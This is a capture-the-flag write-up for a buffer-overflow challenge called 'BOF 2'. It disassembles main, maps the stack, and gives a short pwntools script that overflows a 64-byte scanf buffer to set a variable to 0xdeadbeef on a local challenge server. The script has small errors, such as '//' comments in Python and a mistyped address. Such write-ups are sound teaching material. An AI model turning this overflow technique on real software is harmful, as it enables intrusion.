## BOF 2 Writeup
The first step in completing any binary challenge is to first run the program and see what it does. I ran it tried getting a segmentation fault by filling the buffer with a ton of A's and tried empty inputs.

Then we open up the assembly in nano after using objdump to get an idea of the program layout and where we should set our break points in gdb and perform the static analysis. This problem can be easily solved solely through static analysis; which for this write up we will focus on.

Looking through main there are a few details that catch my eye in this block.

```asm
     80484b9:       83 ec 54                sub    esp,0x54
     80484bc:       c7 45 f4 00 00 00 00    mov    DWORD PTR [ebp-0xc],0x0
     80484c3:       83 ec 08                sub    esp,0x8

```
The first line you see that it subtracts 0x54 (84 bytes) from esp to create room for variables. Then we create a variable at the address of ebp-0xc (12 bytes) and store the value of 0. *Make sure to keep track of the stack, it helps to physically draw it as you go sometimes.* It then subtracts 0x8 (8 bytes) from esp, which in this problem will not matter to us.

```asm
80484c6:       8d 45 b4                lea    eax,[ebp-0x4c]
80484c9:       50                      push   eax
80484ca:       68 c0 85 04 08          push   0x80485c0
80484cf:       e8 cc fe ff ff          call   80483a0 <isoc99_scanf@plt>

```
The next block of code to jump out should be the scanf function and the parameters it calls that precede it. The first line loads in the address of ebp-0x4c into the eax register and then pushes eax to the top of the stack which indicated that it is being used as a parameter to scanf. The third line is pushing a second parameter onto the stack, if in GDB you can use `x 0x80456c0` to find the value of that address which turns out to be `%s`. Then finally the function is called with the parameters and thus the string we input into the buffer gets stored in the address of ebp-0x4c.

Since this is a buffer overflow problem we can expect to find some sort of value for us to overwrite, meaning there is an address above [epb-0x4c] that we need to overflow.

```asm
80484d7:       81 7d f4 ef be ad de    cmp    DWORD PTR [ebp-0xc],0xdeadbeef
80484de:       74 1a                   je     80484fa <main+0x4f>
```


Here is the compare we want to make true, it compares the value in the address of [ebp-0xc] to 0xdeadbeef and jumps if it is equal.

|  address    |   Value     |
|-------------|-------------|
| ebp - 0x5c 	| junk value 	|
|  8 bytes    |            	|
| ebp - 0x4c 	| scan       	|
|  64 bytes   |            	|
| ebp - 0xC  	| 0          	|
|   12 bytes  |            	|
| ebp        	|            	|

With a buffer overflow we need to overwrite 0xC with the value 0xdeadbeef, in order to do that we need to write a buffer to fill the values between 0x4c and 0xC. By looking at the table you can see that is exactly 64 bytes then put 0xdeadbeef, thus we can now begin constructing a payload.

Here is our exploit:

```py
  from pwn import *

  conn = remote('127.0.0.1', 6666)

  payload = 64 * 'a'  // Fill the buffer of 64 bytes to each 0xC
  payload += p32(0xdeadbeef) // Append 0xdeadbeef using little endian with p32

  conn.send(payload)  // Send payload over the connection
  conn.interactive() // Cool fancy shell function

```
Then you have pwned bof2! Get better.
